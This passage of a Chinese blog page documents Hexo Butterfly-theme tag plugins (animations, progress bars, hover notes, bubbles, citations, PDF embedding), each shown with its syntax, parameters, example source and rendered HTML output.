class="emphasis">_xu,3 %&#125;&#123;% icon icon-dog,4 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-boar_</span>hai,5 %&#125;&#123;% icon icon-boar,6 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-rat_zi"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rat"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-ox_chou"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-ox"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-tiger_yin"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-tiger"></use></svg></p><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-rabbit_mao"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rabbit"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-dragon_chen"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-dragon"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-snake_si"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-snake"></use></svg></p><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-horse_wu"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-horse"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-goat_wei"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-goat"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-monkey_shen"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-monkey"></use></svg></p><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-rooster_you"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rooster"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-dog_xu"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-dog"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-boar_hai"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-boar"></use></svg></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-24-特效标签wow">2.24 特效标签wow</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow [animete],[duration],[delay],[offset],[iteration] %&#125;</span><br><span class="line">内容</span><br><span class="line">&#123;% endwow %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>animate</code>: 动画样式，效果详见<a href="https://animate.style/">animate.css参考文档</a></li><li><code>duration</code>: 选填项，动画持续时间，单位可以是<code>ms</code>也可以是<code>s</code>。例如<code>3s</code>，<code>700ms</code>。</li><li><code>delay</code>: 选填项，动画开始的延迟时间，单位可以是<code>ms</code>也可以是<code>s</code>。例如<code>3s</code>，<code>700ms</code>。</li><li><code>offset</code>: 选填项，开始动画的距离（相对浏览器底部）</li><li><code>iteration</code>: 选填项，动画重复的次数</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.flip动画效果。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__zoomIn,5s,5s,100,10 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`zoomIn`动画效果，持续`5s`，延时`5s`，离底部`100`距离时启动，重复`10`次</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><p>2.zoomIn动画效果，持续5s，延时5s，离底部100距离时启动，重复10次</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__zoomIn,5s,5s,100,10 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`zoomIn`动画效果，持续`5s`，延时`5s`，离底部`100`距离时启动，重复`10`次</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><p>3.slideInRight动画效果，持续5s，延时5s</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__slideInRight,5s,5s %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note orange &#x27;fas fa-car&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`slideInRight`动画效果，持续`5s`，延时`5s`。</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><p>4.heartBeat动画效果，延时5s，重复10次。此处注意不用的参数位置要留空，用逗号间隔。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__heartBeat,,5s,,10 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note red &#x27;fas fa-battery-half&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`heartBeat`动画效果，延时`5s`，重复`10`次。</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.flip动画效果。</p><div class='wow animate__zoomIn' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset='100'  data-wow-iteration='10' ><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p><code>zoomIn</code>动画效果，持续<code>5s</code>，延时<code>5s</code>，离底部<code>100</code>距离时启动，重复<code>10</code>次</p></div></div><p>2.zoomIn动画效果，持续5s，延时5s，离底部100距离时启动，重复10次</p><div class='wow animate__zoomIn' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset='100'  data-wow-iteration='10' ><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p><code>zoomIn</code>动画效果，持续<code>5s</code>，延时<code>5s</code>，离底部<code>100</code>距离时启动，重复<code>10</code>次</p></div></div><p>3.slideInRight动画效果，持续5s，延时5s</p><div class='wow animate__slideInRight' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset=''  data-wow-iteration='' ><div class="note orange icon-padding modern"><i class="note-icon fas fa-car"></i><p><code>slideInRight</code>动画效果，持续<code>5s</code>，延时<code>5s</code>。</p></div></div><p>4.heartBeat动画效果，延时5s，重复10次。此处注意不用的参数位置要留空，用逗号间隔。</p><div class='wow animate__heartBeat' data-wow-duration='' data-wow-delay='5s' data-wow-offset=''  data-wow-iteration='10' ><div class="note red icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p><code>heartBeat</code>动画效果，延时<code>5s</code>，重复<code>10</code>次。</p></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-25-进度条-progress">2.25  进度条 progress</h2><div class="note info flat"><p>进度条标签参考<a href="https://rongbuqiu.com/jdt.html">沂佰孜猫-给HEXO文章添加彩色进度条</a>。<br>源样式提取自<a href="https://zwying0814.gitbook.io/cuteen/">Cuteen</a>主题。</p></div><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-2">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% progress [width] [color] [text] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>width</code>: 0到100的阿拉伯数字</li><li><code>color</code>: 颜色，取值有red,yellow,green,cyan,blue,gray</li><li><code>text</code>:进度条上的文字内容</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% progress 10 red 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 30 yellow 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 50 green 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 70 cyan 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 90 blue 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 100 gray 进度条样式预览 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-red"  style="width: 10%" aria-valuenow="10" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-yellow"  style="width: 30%" aria-valuenow="30" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-green"  style="width: 50%" aria-valuenow="50" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-cyan"  style="width: 70%" aria-valuenow="70" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-blue"  style="width: 90%" aria-valuenow="90" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-gray"  style="width: 100%" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-26-注释-notation">2.26 注释 notation</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% nota [label] , [text] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><p><code>label</code>: 注释词汇</p></li><li><p><code>text</code>: 悬停显示的注解内容</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% nota 把鼠标移动到我上面试试 ,可以看到注解内容出现在顶栏 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p><span class='nota' data-nota='可以看到注解内容出现在顶栏'>把鼠标移动到我上面试试</span></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-27-气泡注释-bubble">2.27 气泡注释 bubble</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bubble [content] , [notation] ,[background-color] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>content</code>: 注释词汇</li><li><code>notation</code>: 悬停显示的注解内容</li><li><code>background-color</code>: 可选，气泡背景色。默认为“#71a4e3”</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">最近我学到了不少新玩意儿（虽然对很多大佬来说这些已经是旧技术了），比如CSS的&#123;% bubble 兄弟相邻选择器,&quot;例如 h1 + p &#123;margin-top:50px;&#125;&quot; %&#125;，&#123;% bubble flex布局,&quot;Flex 是 Flexible Box 的缩写，意为&quot;弹性布局&quot;，用来为盒状模型提供最大的灵活性&quot;,&quot;#ec5830&quot; %&#125;，&#123;% bubble transform变换,&quot;transform 属性向元素应用 2D 或 3D 转换。该属性允许我们对元素进行旋转、缩放、移动或倾斜。&quot;,&quot;#1db675&quot; %&#125;，animation的&#123;% bubble 贝塞尔速度曲线,&quot;贝塞尔曲线(Bézier curve)，又称贝兹曲线或贝济埃曲线，是应用于二维图形应用程序的数学曲线。一般的矢量图形软件通过它来精确画出曲线，贝兹曲线由线段与节点组成，节点是可拖动的支点，线段像可伸缩的皮筋&quot;,&quot;#de4489&quot; %&#125;写法，还有今天刚看到的&#123;% bubble clip-path,&quot;clip-path属性使用裁剪方式创建元素的可显示区域。区域内的部分显示，区域外的隐藏。&quot;,&quot;#868fd7&quot; %&#125;属性。这些对我来说很新颖的概念狠狠的冲击着我以前积累起来的设计思路。</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>最近我学到了不少新玩意儿（虽然对很多大佬来说这些已经是旧技术了），比如CSS的<span class="bubble-content">兄弟相邻选择器</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#71a4e3;">例如 h1 + p {margin-top:50px;}</span></span>，<span class="bubble-content">flex布局</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#ec5830;">Flex 是 Flexible Box 的缩写，意为弹性布局&quot;，用来为盒状模型提供最大的灵活性&quot;</span></span>，<span class="bubble-content">transform变换</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#1db675;">transform 属性向元素应用 2D 或 3D 转换。该属性允许我们对元素进行旋转、缩放、移动或倾斜。</span></span>，animation的<span class="bubble-content">贝塞尔速度曲线</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#de4489;">贝塞尔曲线(Bézier curve)，又称贝兹曲线或贝济埃曲线，是应用于二维图形应用程序的数学曲线。一般的矢量图形软件通过它来精确画出曲线，贝兹曲线由线段与节点组成，节点是可拖动的支点，线段像可伸缩的皮筋</span></span>写法，还有今天刚看到的<span class="bubble-content">clip-path</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#868fd7;">clip-path属性使用裁剪方式创建元素的可显示区域。区域内的部分显示，区域外的隐藏。</span></span>属性。这些对我来说很新颖的概念狠狠的冲击着我以前积累起来的设计思路。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-28-引用文献-reference">2.28 引用文献 reference</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% referto [id] , [literature] %&#125;</span><br><span class="line">&#123;% referfrom [id] , [literature] , [url] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><p>referto 引用上标</p><ul><li><p><code>id</code>: 上标序号内容，需与referfrom标签的id对应才能实现跳转</p></li><li><p><code>literature</code>: 引用的参考文献名称</p></li></ul></li><li><p>referfrom 引用出处</p><ul><li><p><code>id</code>: 序号内容，需与referto标签的id对应才能实现 跳转</p></li><li><p><code>literature</code>: 引用的参考文献名称</p></li><li><p><code>url</code>: 引用的参考文献链接，可省略</p></li></ul></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Akilarの糖果屋(akilar.top)是一个私人性质的博客&#123;% referto &#x27;[1]&#x27;,&#x27;Akilarの糖果屋群聊简介&#x27; %&#125;，从各类教程至生活点滴，无话不谈。建群的目的是提供一个闲聊的场所。博客采用Hexo框架&#123;% referto &#x27;[2]&#x27;,&#x27;Hexo中文文档&#x27; %&#125;，Butterfly主题&#123;% referto &#x27;[3]&#x27;,&#x27;Butterfly 安装文档(一) 快速开始&#x27; %&#125;</span><br><span class="line"></span><br><span class="line">本项目参考了Volantis&#123;% referto &#x27;[4]&#x27;,&#x27;hexo-theme-volantis 标签插件&#x27; %&#125;的标签样式。引入<span class="code">`[tag].js`</span>，并针对<span class="code">`butterfly`</span>主题修改了相应的<span class="code">`[tag].styl`</span>。在此鸣谢<span class="code">`Volantis`</span>主题众开发者。</span><br><span class="line">主要参考内容包括各个volantis的内置标签插件文档&#123;% referto &#x27;[5]&#x27;,&#x27;Volantis文档:内置标签插件&#x27; %&#125;</span><br><span class="line">Butterfly主题的各个衍生魔改&#123;% referto &#x27;[6]&#x27;,&#x27;Butterfly 安装文档:标签外挂（Tag Plugins&#x27; %&#125;&#123;% referto &#x27;[7]&#x27;,&#x27;小弋の生活馆全样式预览&#x27; %&#125;&#123;% referto &#x27;[8]&#x27;,&#x27;l-lin-font-awesome-animation&#x27; %&#125;&#123;% referto &#x27;[9]&#x27;,&#x27;小康的butterfly主题使用文档&#x27; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% referfrom &#x27;[1]&#x27;,&#x27;Akilarの糖果屋群聊简介&#x27;,&#x27;https://jq.qq.com/?<span class="emphasis">_wv=1027&amp;k=pGLB2C0N&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[2]&#x27;,&#x27;Hexo中文文档&#x27;,&#x27;https://hexo.io/zh-cn/docs/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[3]&#x27;,&#x27;Butterfly 安装文档(一) 快速开始&#x27;,&#x27;https://butterfly.js.org/posts/21cfbf15/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[4]&#x27;,&#x27;hexo-theme-volantis 标签插件&#x27;,&#x27;https://volantis.js.org/v5/tag-plugins/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[5]&#x27;,&#x27;Volantis文档:内置标签插件&#x27;,&#x27;https://volantis.js.org/tag-plugins/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[6]&#x27;,&#x27;Butterfly 安装文档:标签外挂（Tag Plugins&#x27;,&#x27;https://butterfly.js.org/posts/4aa8abbe/#%E6%A8%99%E7%B1%A4%E5%A4%96%E6%8E%9B%EF%BC%88Tag-Plugins%EF%BC%89&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[7]&#x27;,&#x27;小弋の生活馆全样式预览&#x27;,&#x27;https://lovelijunyi.gitee.io/posts/c898.html&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[8]&#x27;,&#x27;l-lin-font-awesome-animation&#x27;,&#x27;https://github.com/l-lin/font-awesome-animation&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[9]&#x27;,&#x27;小康的butterfly主题使用文档&#x27;,&#x27;https://www.antmoe.com/posts/3b43914f/&#x27; %&#125;</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>Akilarの糖果屋(akilar.top)是一个私人性质的博客<span class="hidden-anchor" id="referto_[1]"></span><sup class="reference"><a href="#referfrom_[1]">[1]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Akilarの糖果屋群聊简介</span><span class="reference-title">参考资料</span></span></span>，从各类教程至生活点滴，无话不谈。建群的目的是提供一个闲聊的场所。博客采用Hexo框架<span class="hidden-anchor" id="referto_[2]"></span><sup class="reference"><a href="#referfrom_[2]">[2]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Hexo中文文档</span><span class="reference-title">参考资料</span></span></span>，Butterfly主题<span class="hidden-anchor" id="referto_[3]"></span><sup class="reference"><a href="#referfrom_[3]">[3]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Butterfly 安装文档(一) 快速开始</span><span class="reference-title">参考资料</span></span></span></p><p>本项目参考了Volantis<span class="hidden-anchor" id="referto_[4]"></span><sup class="reference"><a href="#referfrom_[4]">[4]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">hexo-theme-volantis 标签插件</span><span class="reference-title">参考资料</span></span></span>的标签样式。引入<code>[tag].js</code>，并针对<code>butterfly</code>主题修改了相应的<code>[tag].styl</code>。在此鸣谢<code>Volantis</code>主题众开发者。<br>主要参考内容包括各个volantis的内置标签插件文档<span class="hidden-anchor" id="referto_[5]"></span><sup class="reference"><a href="#referfrom_[5]">[5]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Volantis文档:内置标签插件</span><span class="reference-title">参考资料</span></span></span><br>Butterfly主题的各个衍生魔改<span class="hidden-anchor" id="referto_[6]"></span><sup class="reference"><a href="#referfrom_[6]">[6]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Butterfly 安装文档:标签外挂（Tag Plugins</span><span class="reference-title">参考资料</span></span></span><span class="hidden-anchor" id="referto_[7]"></span><sup class="reference"><a href="#referfrom_[7]">[7]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">小弋の生活馆全样式预览</span><span class="reference-title">参考资料</span></span></span><span class="hidden-anchor" id="referto_[8]"></span><sup class="reference"><a href="#referfrom_[8]">[8]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">l-lin-font-awesome-animation</span><span class="reference-title">参考资料</span></span></span><span class="hidden-anchor" id="referto_[9]"></span><sup class="reference"><a href="#referfrom_[9]">[9]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">小康的butterfly主题使用文档</span><span class="reference-title">参考资料</span></span></span></p><div class="reference-source"><span class="hidden-anchor" id="referfrom_[1]"></span><a class="reference-anchor" href="#referto_[1]">[1]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://jq.qq.com/?_wv=1027&k=pGLB2C0N">Akilarの糖果屋群聊简介</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[2]"></span><a class="reference-anchor" href="#referto_[2]">[2]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://hexo.io/zh-cn/docs/">Hexo中文文档</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[3]"></span><a class="reference-anchor" href="#referto_[3]">[3]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://butterfly.js.org/posts/21cfbf15/">Butterfly 安装文档(一) 快速开始</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[4]"></span><a class="reference-anchor" href="#referto_[4]">[4]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://volantis.js.org/v5/tag-plugins/">hexo-theme-volantis 标签插件</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[5]"></span><a class="reference-anchor" href="#referto_[5]">[5]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://volantis.js.org/tag-plugins/">Volantis文档:内置标签插件</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[6]"></span><a class="reference-anchor" href="#referto_[6]">[6]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://butterfly.js.org/posts/4aa8abbe/#%E6%A8%99%E7%B1%A4%E5%A4%96%E6%8E%9B%EF%BC%88Tag-Plugins%EF%BC%89">Butterfly 安装文档:标签外挂（Tag Plugins</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[7]"></span><a class="reference-anchor" href="#referto_[7]">[7]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://lovelijunyi.gitee.io/posts/c898.html">小弋の生活馆全样式预览</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[8]"></span><a class="reference-anchor" href="#referto_[8]">[8]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://github.com/l-lin/font-awesome-animation">l-lin-font-awesome-animation</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[9]"></span><a class="reference-anchor" href="#referto_[9]">[9]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://www.antmoe.com/posts/3b43914f/">小康的butterfly主题使用文档</a></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-29-PDF展示">2.29 PDF展示</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% pdf 文件路径 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>文件路径</code>: 可以是相对路径或者是在线链接</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 